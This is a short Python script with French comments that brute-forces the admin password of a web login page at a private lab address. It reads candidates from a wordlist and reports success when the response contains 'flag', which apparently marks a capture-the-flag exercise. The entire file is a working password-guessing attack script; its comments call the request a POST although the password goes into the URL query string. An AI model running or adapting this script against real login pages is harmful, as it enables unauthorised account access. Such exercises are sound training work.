import requests

# URL de la page de login
url = 'http://192.168.56.101/index.php?page=signin&username=admin&Login=Login&password='

# Le login connu
username = 'admin'
# Le chemin du fichier de mots de passe
password_file = 'passlist.txt'

def bruteforce_login(url, username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            # Envoyer la requête POST
            response = requests.post(url + password)
            # Vérifier la réponse pour voir si le login est réussi
            if 'flag' in response.text:
                print(f'Mot de passe trouvé: {password}')
                return True
    return False


# Lancer l'attaque bruteforce
if __name__ == '__main__':
       
    success = bruteforce_login(url, username, password_file)
    if not success:
        print('Aucun mot de passe valide trouvé.')
